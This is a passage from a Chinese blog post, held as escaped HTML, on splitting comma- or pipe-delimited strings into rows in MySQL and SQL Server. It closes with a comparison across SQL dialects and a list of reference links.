bold;\">2</span> <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">3</span> <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">4</span> <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">5</span> <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">6</span> <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">7</span> <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">8</span> <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">9</span><span style=\"color: rgba(0, 0, 0, 1);\">) b\n</span><span style=\"color: rgba(0, 0, 255, 1);\">CROSS</span> <span style=\"color: rgba(128, 128, 128, 1);\">JOIN</span> (<span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">0</span> <span style=\"color: rgba(0, 0, 255, 1);\">AS</span> N <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1</span> <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">2</span> <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">3</span> <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">4</span> <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">5</span> <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">6</span> <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">7</span> <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">8</span> <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">9</span><span style=\"color: rgba(0, 0, 0, 1);\">) c;\n</span><span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\"> 使用数字表分割</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span><span style=\"color: rgba(0, 0, 0, 1);\">\nSUBSTRING_INDEX(\nSUBSTRING_INDEX(</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">a,b,c,d</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>, <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">,</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(0, 0, 0, 1);\">, numbers.n),\n</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">,</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(0, 0, 0, 1);\">,\n</span><span style=\"color: rgba(128, 128, 128, 1);\">-</span><span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1</span><span style=\"color: rgba(0, 0, 0, 1);\">\n) </span><span style=\"color: rgba(0, 0, 255, 1);\">AS</span><span style=\"color: rgba(0, 0, 0, 1);\"> part\n</span><span style=\"color: rgba(0, 0, 255, 1);\">FROM</span><span style=\"color: rgba(0, 0, 0, 1);\"> numbers\n</span><span style=\"color: rgba(0, 0, 255, 1);\">WHERE</span> numbers.n <span style=\"color: rgba(128, 128, 128, 1);\">&lt;=</span> LENGTH(<span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">a,b,c,d</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>) <span style=\"color: rgba(128, 128, 128, 1);\">-</span> LENGTH(<span style=\"color: rgba(255, 0, 255, 1);\">REPLACE</span>(<span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">a,b,c,d</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>, <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">,</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>, <span style=\"color: rgba(255, 0, 0, 1);\">''</span>)) <span style=\"color: rgba(128, 128, 128, 1);\">+</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1</span>;</pre>\n</div>\n<span class=\"cnblogs_code_collapse\">View Code</span></div>\n<p>8.0+版本可使用json_table</p>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span><span style=\"color: rgba(0, 0, 0, 1);\"> \n    o.order_id,\n    j.product_id\n</span><span style=\"color: rgba(0, 0, 255, 1);\">FROM</span><span style=\"color: rgba(0, 0, 0, 1);\"> orders o\n</span><span style=\"color: rgba(128, 128, 128, 1);\">JOIN</span><span style=\"color: rgba(0, 0, 0, 1);\"> JSON_TABLE(\n    CONCAT(</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">[\"</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>, <span style=\"color: rgba(255, 0, 255, 1);\">REPLACE</span>(o.product_ids, <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">,</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>, <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">\",\"</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>), <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">\"]</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(0, 0, 0, 1);\">),\n    </span><span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">$[*]</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span> COLUMNS (product_id <span style=\"color: rgba(0, 0, 255, 1);\">INT</span> PATH <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">$</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(0, 0, 0, 1);\">)\n) </span><span style=\"color: rgba(0, 0, 255, 1);\">AS</span> j;</pre>\n</div>\n<h2 id=\"AoqL-1768690884660\">SQL Server</h2>\n</div>\n<div>早期版本无内置函数，只能通过自定义表值函数（TVF）或者XML方法</div>\n<div>\n<div class=\"cnblogs_code\"><img class=\"code_img_closed lazyload\" id=\"code_img_closed_f7b1138f-107e-4278-9ae3-23f7365d8755\" /><img class=\"code_img_opened lazyload\" id=\"code_img_opened_f7b1138f-107e-4278-9ae3-23f7365d8755\" style=\"display: none;\" />\n<div class=\"cnblogs_code_hide\" id=\"cnblogs_code_open_f7b1138f-107e-4278-9ae3-23f7365d8755\">\n<pre><span style=\"color: rgba(0, 0, 255, 1);\">CREATE</span> <span style=\"color: rgba(0, 0, 255, 1);\">FUNCTION</span><span style=\"color: rgba(0, 0, 0, 1);\"> dbo.SplitString\n(\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">@String</span> <span style=\"color: rgba(0, 0, 255, 1);\">NVARCHAR</span>(<span style=\"color: rgba(255, 0, 255, 1);\">MAX</span><span style=\"color: rgba(0, 0, 0, 1);\">),\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">@Delimiter</span> <span style=\"color: rgba(0, 0, 255, 1);\">CHAR</span>(<span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1</span><span style=\"color: rgba(0, 0, 0, 1);\">)\n)\n</span><span style=\"color: rgba(0, 0, 255, 1);\">RETURNS</span> <span style=\"color: rgba(0, 128, 0, 1);\">@Results</span> <span style=\"color: rgba(0, 0, 255, 1);\">TABLE</span><span style=\"color: rgba(0, 0, 0, 1);\"> \n(\n    ID </span><span style=\"color: rgba(0, 0, 255, 1);\">INT</span> <span style=\"color: rgba(255, 0, 255, 1);\">IDENTITY</span>(<span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1</span>,<span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1</span><span style=\"color: rgba(0, 0, 0, 1);\">),\n    Value </span><span style=\"color: rgba(0, 0, 255, 1);\">NVARCHAR</span>(<span style=\"color: rgba(255, 0, 255, 1);\">MAX</span><span style=\"color: rgba(0, 0, 0, 1);\">)\n)\n</span><span style=\"color: rgba(0, 0, 255, 1);\">AS</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">BEGIN</span>\n    <span style=\"color: rgba(0, 0, 255, 1);\">DECLARE</span> <span style=\"color: rgba(0, 128, 0, 1);\">@pos</span> <span style=\"color: rgba(0, 0, 255, 1);\">INT</span> <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">0</span>\n    <span style=\"color: rgba(0, 0, 255, 1);\">DECLARE</span> <span style=\"color: rgba(0, 128, 0, 1);\">@slice</span> <span style=\"color: rgba(0, 0, 255, 1);\">NVARCHAR</span>(<span style=\"color: rgba(255, 0, 255, 1);\">MAX</span><span style=\"color: rgba(0, 0, 0, 1);\">)\n\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">IF</span> <span style=\"color: rgba(128, 128, 128, 1);\">RIGHT</span>(<span style=\"color: rgba(0, 128, 0, 1);\">@String</span>, <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1</span>) <span style=\"color: rgba(128, 128, 128, 1);\">!=</span> <span style=\"color: rgba(0, 128, 0, 1);\">@Delimiter</span>\n        <span style=\"color: rgba(0, 0, 255, 1);\">SET</span> <span style=\"color: rgba(0, 128, 0, 1);\">@String</span> <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(0, 128, 0, 1);\">@String</span> <span style=\"color: rgba(128, 128, 128, 1);\">+</span> <span style=\"color: rgba(0, 128, 0, 1);\">@Delimiter</span>\n\n    <span style=\"color: rgba(0, 0, 255, 1);\">WHILE</span> <span style=\"color: rgba(255, 0, 255, 1);\">CHARINDEX</span>(<span style=\"color: rgba(0, 128, 0, 1);\">@Delimiter</span>, <span style=\"color: rgba(0, 128, 0, 1);\">@String</span>) <span style=\"color: rgba(128, 128, 128, 1);\">&gt;</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">0</span>\n    <span style=\"color: rgba(0, 0, 255, 1);\">BEGIN</span>\n        <span style=\"color: rgba(0, 0, 255, 1);\">SET</span> <span style=\"color: rgba(0, 128, 0, 1);\">@pos</span> <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(255, 0, 255, 1);\">CHARINDEX</span>(<span style=\"color: rgba(0, 128, 0, 1);\">@Delimiter</span>, <span style=\"color: rgba(0, 128, 0, 1);\">@String</span><span style=\"color: rgba(0, 0, 0, 1);\">)\n        </span><span style=\"color: rgba(0, 0, 255, 1);\">SET</span> <span style=\"color: rgba(0, 128, 0, 1);\">@slice</span> <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(128, 128, 128, 1);\">LEFT</span>(<span style=\"color: rgba(0, 128, 0, 1);\">@String</span>, <span style=\"color: rgba(0, 128, 0, 1);\">@pos</span> <span style=\"color: rgba(128, 128, 128, 1);\">-</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1</span><span style=\"color: rgba(0, 0, 0, 1);\">)\n        \n        </span><span style=\"color: rgba(0, 0, 255, 1);\">INSERT</span> <span style=\"color: rgba(0, 0, 255, 1);\">INTO</span> <span style=\"color: rgba(0, 128, 0, 1);\">@Results</span> (Value) <span style=\"color: rgba(0, 0, 255, 1);\">VALUES</span> (<span style=\"color: rgba(0, 128, 0, 1);\">@slice</span><span style=\"color: rgba(0, 0, 0, 1);\">)\n        </span><span style=\"color: rgba(0, 0, 255, 1);\">SET</span> <span style=\"color: rgba(0, 128, 0, 1);\">@String</span> <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(255, 0, 255, 1);\">STUFF</span>(<span style=\"color: rgba(0, 128, 0, 1);\">@String</span>, <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1</span>, <span style=\"color: rgba(0, 128, 0, 1);\">@pos</span>, <span style=\"color: rgba(255, 0, 0, 1);\">''</span><span style=\"color: rgba(0, 0, 0, 1);\">)\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">END</span>\n    \n    <span style=\"color: rgba(0, 0, 255, 1);\">RETURN</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">END</span>\n\n<span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\"> 使用示例</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 128, 128, 1);\">*</span> <span style=\"color: rgba(0, 0, 255, 1);\">FROM</span> dbo.SplitString(<span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">张三,李四,王五</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>, <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">,</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>)</pre>\n</div>\n<span class=\"cnblogs_code_collapse\">View Code</span></div>\n<div class=\"cnblogs_code\"><img class=\"code_img_closed lazyload\" id=\"code_img_closed_3ed525c1-7f6f-49ac-9b5f-2bc138b81373\" /><img class=\"code_img_opened lazyload\" id=\"code_img_opened_3ed525c1-7f6f-49ac-9b5f-2bc138b81373\" style=\"display: none;\" />\n<div class=\"cnblogs_code_hide\" id=\"cnblogs_code_open_3ed525c1-7f6f-49ac-9b5f-2bc138b81373\">\n<pre><span style=\"color: rgba(0, 0, 255, 1);\">DECLARE</span> <span style=\"color: rgba(0, 128, 0, 1);\">@str</span> <span style=\"color: rgba(0, 0, 255, 1);\">NVARCHAR</span>(<span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">100</span>) <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">苹果|香蕉|橙子</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n</span><span style=\"color: rgba(0, 0, 255, 1);\">DECLARE</span> <span style=\"color: rgba(0, 128, 0, 1);\">@separator</span> <span style=\"color: rgba(0, 0, 255, 1);\">CHAR</span>(<span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1</span>) <span style=\"color: rgba(128, 128, 128, 1);\">=</span> <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">|</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n\n</span><span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> \n    <span style=\"color: rgba(255, 0, 255, 1);\">LTRIM</span>(<span style=\"color: rgba(255, 0, 255, 1);\">RTRIM</span>(m.n.value(<span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">.[1]</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>, <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">NVARCHAR(100)</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>))) <span style=\"color: rgba(0, 0, 255, 1);\">AS</span><span style=\"color: rgba(0, 0, 0, 1);\"> SplitValue\n</span><span style=\"color: rgba(0, 0, 255, 1);\">FROM</span><span style=\"color: rgba(0, 0, 0, 1);\"> \n    (</span><span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(255, 0, 255, 1);\">CAST</span>(<span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">&lt;x&gt;</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span> <span style=\"color: rgba(128, 128, 128, 1);\">+</span> <span style=\"color: rgba(255, 0, 255, 1);\">REPLACE</span>(<span style=\"color: rgba(0, 128, 0, 1);\">@str</span>, <span style=\"color: rgba(0, 128, 0, 1);\">@separator</span>, <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">&lt;/x&gt;&lt;x&gt;</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>) <span style=\"color: rgba(128, 128, 128, 1);\">+</span> <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">&lt;/x&gt;</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span> <span style=\"color: rgba(0, 0, 255, 1);\">AS</span> XML)) <span style=\"color: rgba(0, 0, 255, 1);\">AS</span><span style=\"color: rgba(0, 0, 0, 1);\"> t(x)\n</span><span style=\"color: rgba(0, 0, 255, 1);\">CROSS</span><span style=\"color: rgba(0, 0, 0, 1);\"> APPLY \n    x.nodes(</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">/x</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>) <span style=\"color: rgba(0, 0, 255, 1);\">AS</span> m(n);</pre>\n</div>\n<span class=\"cnblogs_code_collapse\">View Code</span></div>\n<p>2016之后的版本可使用原生方法STRING_SPLIT</p>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\">带序号的版本（SQL Server 2022+）</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span><span style=\"color: rgba(0, 0, 0, 1);\"> value, ordinal\n</span><span style=\"color: rgba(0, 0, 255, 1);\">FROM</span> STRING_SPLIT(<span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">a,b,c</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>, <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">,</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>, <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1</span>) <span style=\"color: rgba(0, 128, 128, 1);\">--</span><span style=\"color: rgba(0, 128, 128, 1);\"> 第三个参数启用序号</span></pre>\n</div>\n</div>\n<h1>三、结论</h1>\n<div>　　Spark SQL、PostgreSQL最方便，思路也比较相似，都是先将字符串拆分数组，然后扩展成表。SQLServer新版本实现较为方法，直接一个函数搞定。Oracle利用其connect by来实现，也相对便捷，只是相对主流SQL方言比较小众一点。Mysql新版本相对方便一点，老版本需要辅助表增加维护成本。</div>\n<h1>四、参考链接</h1>\n<div><a href=\"https://www.kimi.com/share/19bd8855-80d2-8885-8000-00003449be16\" rel=\"noopener nofollow\" target=\"_blank\">https://www.kimi.com/share/19bd8855-80d2-8885-8000-00003449be16</a></div>\n<div><a href=\"https://www.kimi.com/share/19bd8885-e842-8472-8000-000042aa28d0\" rel=\"noopener nofollow\" target=\"_blank\">https://www.kimi.com/share/19bd8885-e842-8472-8000-000042aa28d0</a></div>\n<div><a href=\"https://chat.deepseek.com/share/h9bv2i75c90jcfz3uo\" rel=\"noopener nofollow\" target=\"_blank\">https://chat.deepseek.com/share/h9bv2i75c90jcfz3uo</a></div>\n<div><a href=\"http://blog.itpub.net/16436858/viewspace-624191/\" rel=\"noopener nofollow\">http://blog.itpub.net/16436858/viewspace-624191/</a></div>\n<div>&nbsp;</div>\n<div>&nbsp;</div>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-20 08:08</span>&nbsp;\n<a href=\"https://www.cnblogs.com/davablog\">大汪的数据之路</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    }
  ]
}